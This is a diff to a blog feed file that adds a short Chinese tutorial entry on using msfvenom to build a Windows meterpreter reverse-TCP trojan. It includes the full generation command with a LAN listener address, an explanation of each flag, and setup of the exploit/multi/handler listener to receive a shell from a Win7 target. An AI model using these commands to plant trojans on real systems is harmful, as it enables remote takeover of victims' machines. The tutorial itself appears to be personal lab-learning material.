@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>msfvenom生成木马</title>
+      <link href="2021/01/12/msfvenom-sheng-cheng-mu-ma/"/>
+      <url>2021/01/12/msfvenom-sheng-cheng-mu-ma/</url>
+      
+        <content type="html"><![CDATA[<h2 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h2><p>msfvenom可以利用msf的payload来生成木马，可以生成各种形式的木马，也可以指定可执行文件的模板，用编码器进行编码，当然这个编码的免杀肯定是不行的，杀软厂商早就研究的透透的，据说msf的商业版吊打杀软，哇哦</p><h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><p>假定以meterpreter的反弹shell为payload，msfvenom –payload-options -p windows/shell/reverse_tcp可以查看payload可以设置的参数</p><p><img src="1.jpg" alt="查看参数"></p><p>生成木马 msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp lhost=192.168.59.139 lport=4444 -e x86/shikata_ga_nai -i 10 -f exe -o 1.exe </p><p>-a 架构<br>–platform 平台<br>-p payload<br>监听IP端口<br>-e 编码模块<br>-i 几轮加密<br>-f 输出格式<br>-o 输出文件名</p><p><img src="2.jpg" alt="生成"></p><p>这个文件被执行会弹回一个shell，但是这个模块和17_010那种漏洞利用模块不一样，我们还需要在本地监听一下回弹的shell，需要用exploit/multi/handler模块</p><p><img src="3.jpg" alt="监听模块"></p><p>需要先设置payload，再设置参数，lhost监听IP，lport监听端口，然后运行</p><p><img src="5.jpg" alt="监听"></p><p><img src="6.jpg" alt="后台运行"></p><p>目标win7运行木马后就会获得shell</p><p><img src="7.jpg" alt="shell"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> msf </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> msf </tag>
+            
+            <tag> 木马 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>初识msf</title>
       <link href="2021/01/12/chu-shi-msf/"/>
       <url>2021/01/12/chu-shi-msf/</url>
